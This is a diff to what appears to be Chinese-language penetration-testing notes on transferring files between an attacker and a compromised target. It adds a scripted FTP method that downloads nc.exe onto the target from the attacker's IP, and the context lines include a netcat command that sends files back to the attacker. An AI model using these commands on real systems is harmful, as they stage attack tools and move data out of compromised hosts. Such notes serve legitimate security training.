@@ -66,6 +66,8 @@ nc 攻方IP 1234 < 待传回的文件名
 
 ### 利用FTP传输
 
+#### 方法1：
+
 ```bash
 // Attacker
 sudo python3 -m pyftpdlib  -p 21 -w
@@ -78,6 +80,27 @@ ftp -A 攻方IP
 dir               # 查找要传到目标上的程序，本例为：winPEAS.exe
 get winPEAS.exe
 bye
+```
+
+#### 方法2：
+
+```bash
+// Attacker
+cp /usr/share/.../nc.exe /ftphome/
+systemcrl restart pure-ftpd
+```
+
+```bash
+// Target
+echo open 攻方IP >> ftp.txt
+echo USER 用户名 >> ftp.txt
+echo 密码 >> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+
+// 执行ftp.txt
+ftp -v -n -s:ftp.txt
 ```
 
 ### 利用SCP传输
